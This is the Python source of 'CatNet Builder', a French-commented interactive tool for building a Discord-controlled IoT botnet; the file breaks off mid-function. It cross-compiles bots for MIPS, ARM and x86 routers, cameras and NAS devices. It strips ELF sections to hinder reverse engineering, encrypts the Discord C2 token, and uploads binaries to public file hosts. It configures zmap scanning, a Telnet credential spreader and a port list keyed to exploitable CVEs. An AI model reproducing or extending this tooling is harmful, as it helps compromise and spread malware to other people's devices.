#!/usr/bin/env python3
"""
CatNet Builder — Interactive botnet build tool
Run on Kali Linux: python3 main.py
Bots connect directly to Discord — no C2 server IP needed.
"""
from __future__ import annotations
import json
import os
import random
import secrets
import shutil
import subprocess
import sys
import time
import urllib.request
import urllib.error
from dataclasses import dataclass
from pathlib import Path

# ─── Terminal ─────────────────────────────────────────────────────────────────

class C:
    RESET   = '\033[0m'
    BOLD    = '\033[1m'
    RED     = '\033[91m'
    GREEN   = '\033[92m'
    YELLOW  = '\033[93m'
    BLUE    = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN    = '\033[96m'
    WHITE   = '\033[97m'
    CLEAR   = '\033[2J\033[H'

BANNER = f"""{C.CYAN}{C.BOLD}
  ██████╗ █████╗ ████████╗███╗  ██╗███████╗████████╗
 ██╔════╝██╔══██╗╚══██╔══╝████╗ ██║██╔════╝╚══██╔══╝
 ██║     ███████║   ██║   ██╔██╗██║█████╗     ██║
 ██║     ██╔══██║   ██║   ██║╚████║██╔══╝     ██║
 ╚██████╗██║  ██║   ██║   ██║ ╚███║███████╗   ██║
  ╚═════╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚══╝╚══════╝   ╚═╝
{C.MAGENTA}         BOTNET BUILDER v2.0  ·  Discord Direct{C.RESET}
"""

def clear():
    print(C.CLEAR, end='')

def cprint(msg, color=C.WHITE):
    print(f"{color}{msg}{C.RESET}")

def cinput(prompt, color=C.CYAN) -> str:
    return input(f"{color}{prompt}{C.RESET}")

def header(title: str):
    w = 52
    print(f"\n{C.BLUE}{C.BOLD}{'─'*w}{C.RESET}")
    print(f"{C.BLUE}{C.BOLD}  {title}{C.RESET}")
    print(f"{C.BLUE}{C.BOLD}{'─'*w}{C.RESET}")

def item(n, label, val=None):
    vstr = f"  {C.GREEN}[{val}]{C.RESET}" if val is not None else ''
    print(f"  {C.YELLOW}[{n}]{C.RESET} {label}{vstr}")

def sep():
    print(f"  {C.BLUE}{'─'*46}{C.RESET}")

def st(on: bool) -> str:
    return f"{C.GREEN}ON{C.RESET}" if on else f"{C.RED}OFF{C.RESET}"

def run(cmd: list, capture=False) -> tuple[int, str]:
    try:
        r = subprocess.run(cmd, capture_output=capture, text=True)
        return r.returncode, (r.stdout + r.stderr) if capture else ''
    except FileNotFoundError:
        return 127, f"not found: {cmd[0]}"

# ─── Global Go binary path ────────────────────────────────────────────────────
# Force /usr/local/go/bin/go (Go 1.26+) si disponible, sinon cherche dans PATH
_GO_BIN = '/usr/local/go/bin/go' if Path('/usr/local/go/bin/go').exists() else (shutil.which('go') or 'go')

# ─── Dependency check ────────────────────────────────────────────────────────

def check_and_install_deps():
    """Vérifie et installe les dépendances au démarrage."""
    import platform
    is_linux = platform.system() == 'Linux'
    missing_apt = []
    missing_go  = []
    ok = []

    def _have(cmd):
        return shutil.which(cmd) is not None

    # ── Go ──────────────────────────────────────────────────────────────────
    # Cherche Go en priorité dans /usr/local/go/bin (Go 1.26+)
    _go_found = Path('/usr/local/go/bin/go').exists() or _have('go')
    if not _go_found:
        cprint("  [!] go introuvable — installation requise.", C.RED)
        if is_linux:
            cprint("  [~] Tentative d'installation de golang-go via apt...", C.YELLOW)
            rc = subprocess.run(['sudo', 'apt-get', 'install', '-y', 'golang-go'],
                                capture_output=True).returncode
            if rc == 0 and (Path('/usr/local/go/bin/go').exists() or _have('go')):
                cprint("  [+] go installé ✓", C.GREEN)
            else:
                cprint("  [!] Impossible d'installer go automatiquement.", C.RED)
                cprint("      Installez manuellement : https://go.dev/doc/install", C.YELLOW)
        else:
            cprint("  [!] Installez Go depuis https://go.dev/doc/install", C.RED)
    else:
        r = subprocess.run([_GO_BIN, 'version'], capture_output=True, text=True)
        ok.append(f"go {r.stdout.strip().split()[-1] if r.stdout else '?'}")

    # ── curl ────────────────────────────────────────────────────────────────
    if not _have('curl'):
        if is_linux:
            missing_apt.append('curl')
        else:
            cprint("  [!] curl introuvable — installez-le manuellement.", C.RED)
    else:
        ok.append('curl')

    # ── objcopy (binutils) ──────────────────────────────────────────────────
    if not _have('objcopy'):
        if is_linux:
            missing_apt.append('binutils')
        else:
            cprint("  [!] objcopy introuvable — installez binutils.", C.RED)
    else:
        ok.append('objcopy')

    # ── QEMU user-mode emulation ────────────────────────────────────────────
    qemu_bins = ['qemu-arm-static', 'qemu-mips-static', 'qemu-mipsel-static',
                 'qemu-aarch64-static', 'qemu-x86_64-static']
    missing_qemu = [q for q in qemu_bins if not _have(q)]
    if missing_qemu:
        if is_linux:
            missing_apt += ['qemu-user-static']
        else:
            cprint("  [!] qemu-user-static introuvable — QEMU testing désactivé.", C.YELLOW)
    else:
        ok.append('qemu-user-static')

    # ── apt batch install ────────────────────────────────────────────────────
    if missing_apt and is_linux:
        uniq = list(dict.fromkeys(missing_apt))
        cprint(f"  [~] Installation apt : {' '.join(uniq)} ...", C.YELLOW)
        rc = subprocess.run(['sudo', 'apt-get', 'install', '-y'] + uniq,
                            capture_output=True).returncode
        if rc == 0:
            cprint(f"  [+] apt packages installés ✓", C.GREEN)
        else:
            cprint(f"  [!] apt install échoué (code {rc}) — vérifiez manuellement.", C.RED)

    # ── Go 1.16 (legacy bots — kernel < 3.17, pas de memfd_create) ─────────
    go116_path = None
    for candidate in [
        shutil.which('go1.16'),
        str(Path.home() / 'go' / 'bin' / 'go1.16'),
        str(Path.home() / 'sdk' / 'go1.16' / 'bin' / 'go'),
    ]:
        if candidate and Path(candidate).is_file():
            go116_path = candidate
            break

    if not go116_path:
        if _have('go'):
            cprint("  [~] go1.16 absent — installation du downloader...", C.YELLOW)
            subprocess.run([_GO_BIN, 'install', 'golang.org/dl/go1.16@latest'],
                           capture_output=True)
            # S'assurer que ~/go/bin est dans PATH pour trouver go1.16
            _gobin = str(Path.home() / 'go' / 'bin')
            if _gobin not in os.environ.get('PATH', ''):
                os.environ['PATH'] = _gobin + os.pathsep + os.environ.get('PATH', '')
            go116_dl = shutil.which('go1.16') or str(Path.home() / 'go' / 'bin' / 'go1.16')
            if Path(go116_dl).exists():
                cprint("  [~] Téléchargement SDK go1.16 (peut prendre 1-2 min)...", C.YELLOW)
                subprocess.run([go116_dl, 'download'], capture_output=True)
                sdk_go = Path.home() / 'sdk' / 'go1.16' / 'bin' / 'go'
                if sdk_go.exists():
                    go116_path = str(sdk_go)
                    cprint(f"  [+] go1.16 installé → {go116_path} ✓", C.GREEN)
                else:
                    cprint("  [?] go1.16 downloader OK mais SDK manquant", C.YELLOW)
            else:
                cprint("  [!] Impossible d'installer go1.16 — bots legacy désactivés", C.RED)
        else:
            cprint("  [!] go requis pour installer go1.16 (pas encore disponible)", C.RED)
    else:
        ok.append(f'go1.16 ({Path(go116_path).name})')

    # ── Étendre PATH avec ~/go/bin pour garble, go1.16, etc. ────────────────
    _gobin = str(Path.home() / 'go' / 'bin')
    if _gobin not in os.environ.get('PATH', ''):
        os.environ['PATH'] = _gobin + os.pathsep + os.environ.get('PATH', '')
        cprint(f"  [+] PATH étendu avec {_gobin}", C.CYAN)

    # ── garble — géré plus loin dans build() ────────────────────────────────
    if ok:
        cprint(f"  [✓] Dépendances OK : {', '.join(ok)}", C.GREEN)

# ─── ELF hardening ────────────────────────────────────────────────────────────

# Sections Go que Ghidra/gore/GoRE lisent pour reconstruire les symboles.
# Le runtime N'EN A PAS BESOIN pour exécuter — les supprimer rend l'analyse
# statique très difficile même après garble.
_ELF_SECTIONS_TO_STRIP = [
    # .gopclntab intentionnellement absent : le runtime Go en a besoin au démarrage
    # (goroutines, stack unwinding). garble randomise déjà les noms dedans.
    '.gosymtab',        # table de symboles Go — non utilisée à l'exécution
    '.go.buildinfo',    # version Go + chemin module (go version ./binary)
    '.note.go.buildid', # build ID unique (fingerprinting)
]

def strip_elf_sections(path: str) -> bool:
    """Supprime les sections ELF sensibles du binaire Go compilé."""
    p = Path(path)
    if not p.exists() or p.stat().st_size == 0:
        return False
    # Cherche objcopy à chaque appel — préférer objcopy.multiarch qui gère MIPS/ARM/etc.
    objcopy = (shutil.which('objcopy.multiarch')
               or shutil.which('llvm-objcopy')
               or shutil.which('objcopy'))
    strip   = shutil.which('strip')
    # Méthode 1 : objcopy (GNU binutils ou llvm)
    if objcopy:
        args = [objcopy]
        for s in _ELF_SECTIONS_TO_STRIP:
            args += ['--remove-section', s]
        args.append(path)
        r = subprocess.run(args, capture_output=True)
        if r.returncode == 0:
            cprint(f"      ↳ anti-reverse : fait ✓", C.GREEN)
            return True
    if strip:
        r = subprocess.run([strip, '--strip-all', path], capture_output=True)
        if r.returncode == 0:
            cprint(f"      ↳ anti-reverse : fait ✓", C.GREEN)
            return True
    # Méthode 3 : patch Python minimal — met à zéro les noms de sections dans
    # le SHT (section header table) pour dérouter les parseurs ELF.
    try:
        import struct
        data = bytearray(p.read_bytes())
        # Vérifier magic ELF
        if data[:4] != b'\x7fELF':
            return False
        ei_class = data[4]  # 1=32bit, 2=64bit
        if ei_class == 2:  # 64-bit
            e_shoff   = struct.unpack_from('<Q', data, 40)[0]
            e_shentsize = struct.unpack_from('<H', data, 58)[0]
            e_shnum   = struct.unpack_from('<H', data, 60)[0]
            e_shstrndx = struct.unpack_from('<H', data, 62)[0]
        else:  # 32-bit
            e_shoff   = struct.unpack_from('<I', data, 32)[0]
            e_shentsize = struct.unpack_from('<H', data, 46)[0]
            e_shnum   = struct.unpack_from('<H', data, 48)[0]
            e_shstrndx = struct.unpack_from('<H', data, 50)[0]
        if e_shoff == 0 or e_shstrndx == 0:
            return False
        # Lire la string table pour trouver les sections à vider
        if ei_class == 2:
            sh_off  = e_shoff + e_shstrndx * e_shentsize
            sh_name = struct.unpack_from('<I', data, sh_off)[0]
            sh_size = struct.unpack_from('<Q', data, sh_off + 32)[0]
            sh_addr_off = struct.unpack_from('<Q', data, sh_off + 24)[0]
        else:
            sh_off  = e_shoff + e_shstrndx * e_shentsize
            sh_name = struct.unpack_from('<I', data, sh_off)[0]
            sh_size = struct.unpack_from('<I', data, sh_off + 20)[0]
            sh_addr_off = struct.unpack_from('<I', data, sh_off + 16)[0]
        strtab = bytes(data[sh_addr_off:sh_addr_off + sh_size])
        for i in range(e_shnum):
            off = e_shoff + i * e_shentsize
            name_off = struct.unpack_from('<I', data, off)[0]
            end = strtab.find(b'\x00', name_off)
            sname = strtab[name_off:end].decode('ascii', errors='replace')
            if sname in _ELF_SECTIONS_TO_STRIP:
                if ei_class == 2:
                    sec_off  = struct.unpack_from('<Q', data, off + 24)[0]
                    sec_size = struct.unpack_from('<Q', data, off + 32)[0]
                else:
                    sec_off  = struct.unpack_from('<I', data, off + 16)[0]
                    sec_size = struct.unpack_from('<I', data, off + 20)[0]
                if sec_off and sec_size:
                    data[sec_off:sec_off + sec_size] = b'\x00' * sec_size
        p.write_bytes(bytes(data))
        cprint(f"      ↳ anti-reverse : fait ✓", C.GREEN)
        return True
    except Exception:
        cprint(f"      ↳ anti-reverse : erreur", C.RED)
        return False

# ─── Token obfuscation ────────────────────────────────────────────────────────

def _aes_encrypt(token: str, channel: str, guild: str) -> dict:
    """Chiffre token+channel+guild AES-256-GCM, retourne les fragments hex."""
    import hashlib
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM

    payload = f"{token}\x01{channel}\x01{guild}".encode()
    seed  = secrets.token_bytes(32)
    salt  = secrets.token_bytes(16)
    nonce = secrets.token_bytes(12)
    key   = hashlib.pbkdf2_hmac('sha256', seed, salt, 20_000, dklen=32)
    ct    = AESGCM(key).encrypt(nonce, payload, None)

    def bxor(b: bytes, c: int) -> str:
        return bytes(x ^ c for x in b).hex()

    s1, s2, s3 = seed[:11], seed[11:22], seed[22:]
    sa, sb = salt[:8], salt[8:]
    return {
        '_ct': ct.hex(), '_n': nonce.hex(),
        '_s1': bxor(s1, 0x5A), '_s2': bxor(s2, 0xA3), '_s3': bxor(s3, 0x7F),
        '_sa': bxor(sa, 0xC1), '_sb': bxor(sb, 0x3E),
    }

def aes_encrypt_credentials(token: str, channel: str, guild: str) -> dict:
    return _aes_encrypt(token, channel, guild)

def aes_encrypt_credentials_fiber(token: str, channel: str, guild: str) -> dict:
    return _aes_encrypt(token, channel, guild)



# ─── Config ───────────────────────────────────────────────────────────────────

CONFIG_FILE = Path('.catnet_config.json')

@dataclass
class Config:
    token:      str  = ''
    channel_id: str  = ''
    guild_id:   str  = ''
    # Mode de distribution des binaires
    # 'auto'   = upload automatique (transfer.sh / catbox) — pas besoin d'IP/port
    # 'local'  = fiber sert les fichiers lui-même (besoin IP + port + portmap)
    distrib_mode: str  = 'auto'
    upload_host:  str  = 'catbox.moe'  # hébergeur primaire (catbox.moe / transfer.sh / 0x0.st)
    self_host_url: str = ''  # ex: https://heb.robbhabbo.online — mis en 1er si défini
    # Serveur C2 / HTTP (uniquement si distrib_mode = 'local')
    c2_host:      str  = ''
    c2_http_port: str  = '80'
    # Beacon CVE Work tracker — IP:PORT que le bot pinge au démarrage
    # fiber écoute sur ce port et incrémente CVE Work à chaque connexion
    # Laisser vide pour désactiver (mode auto sans machine publique)
    beacon_addr:  str  = ''
    # Fichier ip:user:pass pour le spreader Telnet (laisser vide pour désactiver)
    telnet_creds: str  = ''
    # Ports scannés sur les victimes (liste séparée par virgules)
    scan_ports:   str  = '23,80,8080,7547,2323'
    scan_bw:      str  = '10M'    # Bande passante max zmap — garder bas sur VM (10M safe)
    scan_rate:    int  = 1000     # Paquets/sec max — 1000 pps safe VM, 5000+ serveur dédié
    use_all_lst:  bool = True     # Utiliser all.lst avec zmap
    # Bot architectures (Go cross-compile)
    arch_mips:    bool = True
    arch_mipsle:  bool = True
    arch_arm:     bool = True
    arch_armv5:   bool = True
    arch_arm64:   bool = True
    arch_x86:     bool = False
    arch_x86_64:  bool = True
    arch_ppc:     bool = False

    def save(self):
        CONFIG_FILE.write_text(json.dumps(self.__dict__, indent=2))

    @classmethod
    def load(cls) -> 'Config':
        if CONFIG_FILE.exists():
            try:
                return cls(**json.loads(CONFIG_FILE.read_text()))
            except Exception:
                pass
        return cls()

# ─── Architectures ────────────────────────────────────────────────────────────
# (attr, label, GOOS, GOARCH, extra env vars, output name)
BUILD_DIR  = 'build'          # binaires Go actuel
LEGACY_DIR = 'build/legacy'  # binaires Go 1.16 (kernel < 3.17)

ARCHS = [
    ('arch_mips',   'MIPS    big-endian  (Hikvision/ZTE/Huawei)',   'linux', 'mips',   {'GOMIPS': 'softfloat'},  f'{BUILD_DIR}/bot.mips'),
    ('arch_mipsle', 'MIPSle  little-end  (D-Link/Netgear/TP-Link)', 'linux', 'mipsle', {'GOMIPS': 'softfloat'},  f'{BUILD_DIR}/bot.mipsle'),
    ('arch_arm',    'ARMv6   (IoT/cam/DVR modernes)',                'linux', 'arm',    {'GOARM':  '6'},          f'{BUILD_DIR}/bot.arm'),
    ('arch_armv5',  'ARMv5   (DVR/cam anciens génération)',          'linux', 'arm',    {'GOARM':  '5'},          f'{BUILD_DIR}/bot.armv5'),
    ('arch_arm64',  'ARM64   (IoT nouvelle génération)',             'linux', 'arm64',  {},                       f'{BUILD_DIR}/bot.arm64'),
    ('arch_x86',    'x86     32-bit',                                'linux', '386',    {},                       f'{BUILD_DIR}/bot.x86'),
    ('arch_x86_64', 'x86_64  (NAS/serveurs/PC)',                    'linux', 'amd64',  {},                       f'{BUILD_DIR}/bot.x86_64'),
    ('arch_ppc',    'PowerPC (vieux NAS Synology/QNAP)',             'linux', 'ppc64',  {},                       f'{BUILD_DIR}/bot.ppc'),
]

# ─── Builder ──────────────────────────────────────────────────────────────────

class Builder:
    def __init__(self):
        self.cfg = Config.load()
        self._scan_stop = False
        self._uploading_backup = False

    def run(self):
        clear(); print(BANNER)
        header("VÉRIFICATION DES DÉPENDANCES")
        check_and_install_deps()
        while True:
            clear(); print(BANNER)
            header("MENU PRINCIPAL")
            item(1, "Configuration Discord")
            item(2, "Architectures cibles")
            item(3, "Installer dépendances Go")
            item(4, "BUILD")
            item(5, "Gérer services")
            item(6, "Quitter")
            sep()
            match cinput("\n  > Choix : ").strip():
                case '1': self.config_menu()
                case '2': self.arch_menu()
                case '3': self.deps_menu()
                case '4': self.build_menu()
                case '5': self.services_menu()
                case '6': sys.exit(0)

    # ── Ports IoT ──────────────────────────────────────────────────────────────
    IOT_PORTS = [
        # ── Telnet ────────────────────────────────────────────────────────────
        ('23',    'Telnet          (Mirai, credentials faibles)'),
        ('2323',  'Telnet alt      (même vecteur, port alternatif)'),
        ('24',    'Telnet alt 2    (certains routeurs Huawei/ZTE)'),
        # ── HTTP admin ────────────────────────────────────────────────────────
        ('80',    'HTTP            (panneaux admin routeurs/cam)'),
        ('81',    'HTTP alt        (D-Link, cam IP anciennes)'),
        ('8080',  'HTTP alt 2      (NAS, cam, routeurs alternatifs)'),
        ('8888',  'HTTP alt 3      (Tenda, TP-Link, Mikrotik WebFig)'),
        # ── HTTPS admin ───────────────────────────────────────────────────────
        ('443',   'HTTPS           (admin routeurs + VPN: FortiGate CVE-2018-13379, Pulse CVE-2019-11510, Citrix CVE-2019-19781)'),
        ('8443',  'HTTPS alt       (SonicWall SSLVPN CVE-2021-20016, panneaux admin)'),
        # ── VPN vulnérables ───────────────────────────────────────────────────
        ('4443',  'Pulse Secure    (Pulse Connect Secure, port alternatif)'),
        ('10443', 'FortiGate alt   (port HTTPS alternatif FortiGate)'),
        ('4444',  'F5 BIG-IP alt   (F5 iControl CVE-2021-22986)'),
        ('8888',  'Citrix ADC alt  (Citrix Gateway alternatif)'),
        ('9443',  'VPN divers      (Cisco ASA, Palo Alto GlobalProtect alt)'),
        # ── Protocoles IoT spécifiques ────────────────────────────────────────
        ('7547',  'TR-069 / CWMP   (Huawei HG532, CVE-2017-17215)'),
        ('5555',  'ADB Android     (téléphones/TV exposés)'),
        ('9034',  'Realtek UDP SDK (CVE-2021-35394, 65+ marques)'),
        ('30005', 'Realtek alt     (variante SDK Realtek)'),
        # ── Caméras IP ────────────────────────────────────────────────────────
        ('37777', 'Dahua cam       (accès direct firmware)'),
        ('34567', 'DVR/NVR H.264   (très répandu Chine, no-auth)'),
        ('9527',  'TVT/ONVIF cam   (CVE vulnérable)'),
        ('60001', 'Milesight cam   (accès non authentifié)'),
        ('554',   'RTSP            (flux caméras, brute-force creds)'),
        ('8554',  'RTSP alt        (caméras IP alternatives)'),
        # ── VoIP ──────────────────────────────────────────────────────────────
        ('5060',  'SIP             (Yealink, Grandstream, CVE-2021-27561)'),
        # ── NAS / serveurs embarqués ──────────────────────────────────────────
        ('5000',  'Synology DSM    (NAS Synology panneaux admin)'),
        ('5001',  'Synology HTTPS  (NAS Synology HTTPS)'),
        ('8291',  'Winbox MikroTik (CVE-2018-14847, leak creds)'),
        # ── Routeurs ──────────────────────────────────────────────────────────
        ('52869', 'UPnP MiniUPnPd  (CVE-2013-0229, buffer overflow)'),
        ('1900',  'UPnP SSDP UDP   (amplification + device discovery)'),
        ('161',   'SNMP UDP        (community "public", dump config)'),
    ]

    # Groupes prédéfinis pour activation rapide
    _PORT_PRESETS = {
        'telnet':  {'23','2323','24'},
        'http':    {'80','81','8080','8888'},
        'https':   {'443','8443'},
        'vpn':     {'443','4443','10443','4444','9443','8443'},
        'cameras': {'37777','34567','9527','60001','554','8554'},
        'iot':     {'7547','5555','9034','30005'},
        'nas':     {'5000','5001','8291'},
        'voip':    {'5060'},
        'upnp':    {'52869','1900','161'},
    }

    def _ports_menu(self):
        active = set(self.cfg.scan_ports.split(',')) if self.cfg.scan_ports else {'23','80','8080','7547','2323'}
        # Dédupliquer IOT_PORTS pour l'affichage (port 8888 et 443 apparaissent 2x)
        seen_ports: set[str] = set()
        display_ports = []
        for entry in self.IOT_PORTS:
            if entry[0] not in seen_ports:
                seen_ports.add(entry[0])
                display_ports.append(entry)
        while True:
            clear(); print(BANNER)
            header("PORTS DE SCAN IoT")
            cprint(f"  {C.BLUE}ℹ  Un scanner (screen) sera lancé par port activé.{C.RESET}\n")
            for i, (port, desc) in enumerate(display_ports, 1):
                state = C.GREEN + '✓' if port in active else C.RED + '✗'
                num   = f"{C.CYAN}[{i:2}]{C.RESET}" if i < 10 else f"{C.CYAN}[{i}]{C.RESET}"
                cprint(f"  [{state}{C.RESET}] {num} :{port:<6} {desc}")
            cprint(f"\n  {C.YELLOW}[a]{C.RESET} Tout activer       {C.YELLOW}[n]{C.RESET} Tout désactiver")
            cprint(f"  {C.YELLOW}[p]{C.RESET} Preset rapide      {C.YELLOW}[c]{C.RESET} Saisie libre (ex: 23,80,8080)")
            sep()
            item(0, "Retour (sauvegarde)")
            sep()
            ch = cinput("\n  > Choix : ").strip().lower()
            if ch == '0':
                self.cfg.scan_ports = ','.join(sorted((p for p in active if p.isdigit()), key=int))
                self.cfg.save(); return
            elif ch == 'a':
                active = {p for p, _ in display_ports}
                cprint(f"  {C.GREEN}[+] Tous les ports activés ({len(active)}){C.RESET}")
            elif ch == 'n':
                active = set()
                cprint(f"  {C.YELLOW}[i] Tous les ports désactivés{C.RESET}")
            elif ch == 'p':
                cprint(f"\n  Presets disponibles :")
                for name, pset in self._PORT_PRESETS.items():
                    cprint(f"  {C.CYAN}{name:<10}{C.RESET} {', '.join(sorted(pset, key=int))}")
                v = cinput("  > Nom du preset (ou plusieurs séparés par espace) : ", C.WHITE).strip().lower()
                for name in v.split():
                    if name in self._PORT_PRESETS:
                        active |= self._PORT_PRESETS[name]
                        cprint(f"  {C.GREEN}[+] Preset '{name}' ajouté{C.RESET}")
                    else:
                        cprint(f"  {C.RED}[!] Preset '{name}' inconnu{C.RESET}")
            elif ch == 'c':
                v = cinput("  Ports (ex: 23,80,8080) : ", C.WHITE).strip()
                if v:
                    active = set(p.strip() for p in v.split(',') if p.strip().isdigit())
            elif ch.isdigit() and 1 <= int(ch) <= len(display_ports):
                port = display_ports[int(ch)-1][0]
                if port in active: active.discard(port)
                else:              active.add(port)

    # ── Config ─────────────────────────────────────────────────────────────────
    def config_menu(self):
        while True:
            clear(); print(BANNER)
            header("CONFIGURATION")
            tok = (self.cfg.token[:16] + '…') if self.cfg.token else '(vide)'

            # ── Discord (toujours requis)
            cprint(f"\n  {C.YELLOW}── Discord (obligatoire) ──{C.RESET}")
            item(1, "Token bot Discord", tok)
            item(2, "Channel ID (C2)",   self.cfg.channel_id or '(vide)')
            item(3, "Guild ID",          self.cfg.guild_id   or '(vide)')

            # ── Mode de distribution
            mode_label = f'Upload auto ({self.cfg.upload_host})' if self.cfg.distrib_mode == 'auto' \
                         else 'Local (fiber sert les fichiers)'
            cprint(f"\n  {C.YELLOW}── Distribution des binaires ──{C.RESET}")
            item(4, "Mode", mode_label)

            if self.cfg.distrib_mode == 'auto':
                item(5, "Hébergeur upload", self.cfg.upload_host)
                sh_label = self.cfg.self_host_url if self.cfg.self_host_url else '(non configuré)'
                item('h', "Serveur perso (prioritaire)", sh_label)
                cprint(f"\n  {C.BLUE}ℹ  Le build uploadera automatiquement les binaires.{C.RESET}")
                cprint(f"  {C.BLUE}   Pas besoin d'IP publique ni de portmap.{C.RESET}")
                if self.cfg.self_host_url:
                    cprint(f"  {C.GREEN}   Serveur perso actif → uploadé en priorité sur {self.cfg.self_host_url}{C.RESET}")
            else:
                item(5, "IP / domaine C2",  self.cfg.c2_host or '(vide)')
                item(6, "Port HTTP exposé", self.cfg.c2_http_port)
                cprint(f"\n  {C.BLUE}ℹ  fiber servira les binaires depuis cette machine.{C.RESET}")
                cprint(f"  {C.BLUE}   Nécessite portmap ou IP publique.{C.RESET}")

            # ── Scan (toujours)
            cprint(f"\n  {C.YELLOW}── Scanner ──{C.RESET}")
            item(7, "Ports scannés (IoT)",  self.cfg.scan_ports or '23,80,8080,7547,2323')
            item(8, "Bande passante scan",  self.cfg.scan_bw or '10M')
            item(9, "Paquets/sec (--rate)", str(self.cfg.scan_rate or 1000))
            cprint(f"  {C.BLUE}ℹ  VM : 500-2000 pps | Serveur dédié : 5000-50000 pps{C.RESET}")
            item('b', "Utiliser all.lst",   'Oui' if self.cfg.use_all_lst else 'Non')
            # ── Beacon CVE Work
            beacon_val = self.cfg.beacon_addr or '(désactivé)'
            cprint(f"\n  {C.YELLOW}── CVE Work Tracker ──{C.RESET}")
            item('a', "Beacon addr (IP:PORT)",  beacon_val)
            cprint(f"  {C.BLUE}ℹ  Le bot pinge cette adresse au démarrage → CVE Work++{C.RESET}")
            # ── Telnet Spread
            tc_val = self.cfg.telnet_creds or '(désactivé)'
            cprint(f"\n  {C.YELLOW}── Telnet Spreader ──{C.RESET}")
            item('t', "Fichier creds (ip:user:pass)", tc_val)
            cprint(f"  {C.BLUE}ℹ  Format : une ligne par cible → 192.168.1.1:admin:admin{C.RESET}")
            cprint(f"  {C.BLUE}   Requis : IP publique ou portmap sur port TCP (ex: 1.2.3.4:6660){C.RESET}")
            sep()
            item(0, "Retour")
            sep()
            match cinput("\n  > Choix : ").strip():
                case '1':
                    v = cinput("  Token : ", C.WHITE).strip()
                    if v: self.cfg.token = v; self.cfg.save()
                case '2':
                    v = cinput("  Channel ID : ", C.WHITE).strip()
                    if v: self.cfg.channel_id = v; self.cfg.save()
                case '3':
                    v = cinput("  Guild ID : ", C.WHITE).strip()
                    if v: self.cfg.guild_id = v; self.cfg.save()
                case '4':
                    self.cfg.distrib_mode = 'local' if self.cfg.distrib_mode == 'auto' else 'auto'
                    self.cfg.save()
                case '5':
                    if self.cfg.distrib_mode == 'auto':
                        cprint("  [1] catbox.moe (recommandé)  [2] filebin.net", C.WHITE)
                        c = cinput("  > Choix : ", C.WHITE).strip()
                        if c == '2': self.cfg.upload_host = 'filebin.net'
                        else:        self.cfg.upload_host = 'catbox.moe'
                        self.cfg.save()
                    else:
                        v = cinput("  IP / domaine (ex: shatered5220-55994.portmap.host) : ", C.WHITE).strip()
                        if v: self.cfg.c2_host = v; self.cfg.save()
                case '6':
                    if self.cfg.distrib_mode == 'local':
                        v = cinput("  Port HTTP exposé [défaut: 80] : ", C.WHITE).strip()
                        if v: self.cfg.c2_http_port = v; self.cfg.save()
                case '7':
                    self._ports_menu(); continue
                case '8':
                    v = cinput("  Bande passante (ex: 10M, 50M, 500K) [défaut: 10M] : ", C.WHITE).strip()
                    if v: self.cfg.scan_bw = v; self.cfg.save()
                case '9':
                    v = cinput("  Paquets/sec (VM: 500-2000 | dédié: 5000-50000) [défaut: 1000] : ", C.WHITE).strip()
                    if v.isdigit(): self.cfg.scan_rate = int(v); self.cfg.save()
                case 'h':
                    if self.cfg.distrib_mode == 'auto':
                        cprint("  URL de ton serveur perso (ex: https://heb.robbhabbo.online)", C.WHITE)
                        cprint("  Laisser vide pour désactiver.", C.WHITE)
                        v = cinput("  > URL : ", C.WHITE).strip().rstrip('/')
                        self.cfg.self_host_url = v; self.cfg.save()
                case 'b':
                    self.cfg.use_all_lst = not self.cfg.use_all_lst; self.cfg.save()
                    cprint(f"  [+] all.lst : {'Oui' if self.cfg.use_all_lst else 'Non'}", C.GREEN)
                case 'a':
                    v = cinput("  Beacon addr (ex: 1.2.3.4:6660, laisser vide pour désactiver) : ", C.WHITE).strip()
                    self.cfg.beacon_addr = v; self.cfg.save()
                    cprint(f"  [+] Beacon : {v or '(désactivé)'}", C.GREEN)
                case 't':
                    v = cinput("  Fichier creds telnet (chemin absolu, laisser vide pour désactiver) : ", C.WHITE).strip()
                    self.cfg.telnet_creds = v; self.cfg.save()
                    cprint(f"  [+] Telnet creds : {v or '(désactivé)'}", C.GREEN)
                case '0': return

    # ── Architectures ──────────────────────────────────────────────────────────
    def arch_menu(self):
        while True:
            clear(); print(BANNER)
            header("ARCHITECTURES CIBLES  (cross-compile Go natif)")
            for i, (attr, label, goos, goarch, _, out) in enumerate(ARCHS, 1):
                item(i, f"{label:<32} → {out}", st(getattr(self.cfg, attr)))
            cprint(f"\n  {C.BLUE}ℹ  Pas besoin de cross-compilateurs — Go compile nativement.{C.RESET}")
            sep()
            item(0, "Retour")
            sep()
            choice = cinput("\n  > Toggle (num) ou 0 : ").strip()
            if choice == '0': return
            try:
                n = int(choice)
                if 1 <= n <= len(ARCHS):
                    attr = ARCHS[n-1][0]
                    setattr(self.cfg, attr, not getattr(self.cfg, attr))
                    self.cfg.save()
            except ValueError:
                pass

    # ── Deps ───────────────────────────────────────────────────────────────────
    def deps_menu(self):
        clear(); print(BANNER)
        header("INSTALLER GO + ZMAP")
        cprint("  Installe Go et zmap (Kali/Debian). Root requis.", C.YELLOW)
        cinput("  > Entrée pour continuer ou Ctrl+C pour annuler...")
        os.system("apt update -qq && apt install -y golang zmap")
        cprint("  [*] go mod tidy...", C.YELLOW)
        run([_GO_BIN, 'mod', 'tidy'])
        cprint("  [+] Dépendances installées.", C.GREEN)
        cinput("  > Entrée...")

    # ── Build ──────────────────────────────────────────────────────────────────
    def build_menu(self):
        clear(); print(BANNER)
        header("BUILD")

        # Validation
        missing = []
        if not self.cfg.token:      missing.append("Token Discord")
        if not self.cfg.channel_id: missing.append("Channel ID")
        if not self.cfg.guild_id:   missing.append("Guild ID")
        if missing:
            cprint(f"\n  [!] Manquant : {', '.join(missing)}", C.RED)
            cinput("  > Entrée..."); return

        # Vérifie Go (cherche d'abord dans /usr/local/go/bin)
        _go_check = Path('/usr/local/go/bin/go').exists() or shutil.which('go') is not None
        if not _go_check:
            cprint("  [!] Go non installé. Utilise le menu 'Installer dépendances'.", C.RED)
            cinput("  > Entrée..."); return

        # Demander avant de commencer
        do_legacy = cinput("\n  > Compiler aussi la version legacy (kernel < 3.17) ? [o/N] : ", C.YELLOW).strip().lower() == 'o'
        go116_path = None
        if do_legacy:
            # Chercher go1.16 dans les emplacements courants (root ou user)
            _candidates = [
                '/home/kali/go/bin/go1.16',
                str(Path.home() / 'go/bin/go1.16'),
                '/root/go/bin/go1.16',
            ]
